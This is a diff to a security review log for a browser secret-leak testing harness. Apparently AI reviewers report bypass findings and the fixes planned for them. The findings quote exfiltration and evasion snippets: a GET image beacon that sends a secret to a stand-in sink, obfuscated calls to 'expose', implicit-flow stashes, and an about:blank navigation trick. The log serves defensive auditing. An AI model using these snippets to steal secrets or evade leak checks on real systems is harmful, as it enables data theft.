@@ -1119,3 +1119,67 @@ The same-constructor rule applied to the real-click probe after T3-3 had not bee
 both payloads pass through `flatCopy()`; thresholds, samples, warm-up and the timed operations are unchanged. With
 this the amended gate has produced no rejection in 6/6 full-file runs and every other probe has stayed green in all
 16 full-file observations of the day.
+
+## Final2 round — three channels on 530b0cb..5757a24 (`m4-fix-final2` + probe P slice) — 2026-09-02
+
+Claude QA (`H-Q*`), Claude security (`H-S*`), Codex (`I-X*`). All three **NEEDS-ATTENTION; every G-* P1/P2 is
+CLOSED by reproduced mutation** — G-S1 in real Chromium (12 security probes of submit-control enumeration found no
+bypass), the retention corpus S1–S15, the native-`baseURI` shadow, `unobserved` scoring, LF/CR/CRLF, the attestation
+gate, capture-failure marking, `leakScan` validation. Golden vectors re-derived independently by both QA (scipy +
+stdlib) and Codex (stdlib, 1.12e-16). Probe P still rejects the real length-dependent-decode mutant (p = 0 on both
+length probes). The flatCopy construction holds (tripwire effect +0.06/+0.05/−/−, mixed signs).
+
+### P1
+- **H-S1 bodyless (GET) exfiltration is structurally invisible** (`host.ts` `recordRequest` returns early without
+  `postData`): a trusted page's own listener doing `new Image().src = SINK + '?p=' + value` delivers the plaintext to
+  a second origin while the leak checker reports 0 leaks. Pre-existing (S4-3, deferred to M5) but the deferral lived
+  only in a code comment. **Absorb now:** every browser request is also recorded as a `url` event with the full URL
+  (query included) as bytes, so layer 4 scans URLs; SCHEMA says so.
+- **I-X1 / H-S2 / H-S3 / H-S4 / H-S7 — retention rule, round eight (three channels, four classes).** (a) implicit
+  flow: `for (…; i < value.length; …) moduleCounter++`, `if (value.charCodeAt(0) === 115) moduleStash = 's'` — property
+  reads are whitelisted by name and tainted control flow is unconstrained (Codex); (b) the approved `callFunctionOn`
+  sink's body is checked for assignments only — `zzStash.push(JSON.stringify(args))` retains (security); (c) the
+  `Secret` parameter in `session.ts` is untracked and the expose/consume site guard is a regex — `(secret as any)['expo'
+  + 'se']()` retains (security); (d) `localFile.ts` is outside the rule's file set — a stash before `new Secret(...)`
+  accumulates every plaintext (security); (e) `isInjectLineBreakCheck` short-circuits the context check — `if
+  (value.includes('\n')) zzBit = 1` passes (security). **Absorb:** taint may appear in a condition only as the direct
+  condition of an `if` whose consequent is a single `return` of a fixed outcome; never in a loop condition, `for…of`
+  source, update expression, or non-local write; the sink body gets a non-escape analysis; the `Secret` binding is
+  tainted with an AST site check; `localFile.ts` joins the file set with a fail-closed per-file allowlist; corpus
+  S16–S23.
+
+### P2
+- **I-X2 / H-Q4 / H-Q5 / H-S8 `unobserved` provenance and surfacing.** A malformed `assertedOrigin` refuses before
+  observation and is recorded as unobserved (inflatable); an `observeTop()` throw is not recorded at all; the count is
+  never aggregated or printed; an attacker page self-navigating to `about:blank` converts a wrong-origin attempt into
+  `unobserved: 1` (no leak; `blob:` does not evade). **Absorb:** explicit `observation.unobserved` set only when the
+  trusted observation was attempted and unavailable; the host emits from that flag alone; aggregated and printed per
+  scenario (SCHEMA); the conversion residual is stated in SCHEMA.
+- **H-Q1 / H-S5 the +0.25 ms positive control** runs 64 pairs of a spin loop and failed 1-in-8 full-suite runs under
+  load (isolated 20/20; the failure needs the parallel suite plus Chromium). **Absorb:** the gate assertion runs on a
+  deterministic difference vector; the real-timing control moves to 500 pairs (kept asserted) — α untouched.
+- **H-Q2 flatCopy has no killing test** → source assertion (both constants through `flatCopy`; no bare
+  `rotateFinalCharacter(CANARY)` binding).
+
+### P3 (absorbed unless marked)
+`offline.ts`'s `unobserved` agreement and type-guard clauses survive deletion (H-Q3) → tests; the exploit
+reproduction's leak assertions are vacuous on the passing tree (H-Q6) → unconditional; `topPath` malformed for
+`blob:` documents (H-S9) → http(s) only; transcript surface test cannot see `private` (I-X3) → `#snapshotEvents` +
+prototype absence; no lab route for an off-origin form claiming the field via `form=` (security gap) → route +
+refused; `validateScenarioAuth` ignores `credentialControl` (security gap) → validated; the live family gate has no
+negative control (QA gap) → biased probe injected → gate fires; `DESTINATION_PREDICATES_SOURCE` is a 66-line
+in-realm function (both Claude channels) → the image-button block is extracted into a named in-realm helper in the
+same source string; `inRealm.ts` is outside the retention rule but defended by token assertions (H-S10) → scope note.
+**Decided, recorded:** the two length probes stay in the Holm family (H-S6) — they are equal-work by construction of
+the constant-size transport, exist to detect length-dependent work, and rejected the real mutant at p = 0; the
+comment is corrected. Test registration callbacks are exempt from the 50-line rule (I-X4; `.claude/rules/core.md`).
+The `5757a24` Deviations stanza omitted `transcript.test.ts` and the register addendum and mis-stated the reason
+for the core test hand-off (H-Q7) — recorded here. `leakScan` scans `bytes` only (stated in SCHEMA).
+**Residuals:** a trusted page's own script can read the filled value synchronously after the setter — the
+destination predicates are defence in depth against injected markup, layer 4 measures script (stated in the spec's
+threat model now); exported `classify()`/`hasAuthorizedNetworkCanary()` do not validate auth themselves (callers do);
+the retention rule is a syntactic pass over a pinned file set; a filtered test command can skip the family gate.
+
+### Disposition
+**Not merge-ready as committed.** Fix slice `m4-fix-final3` (Codex) absorbs everything above; the three channels
+review that diff; then merge.
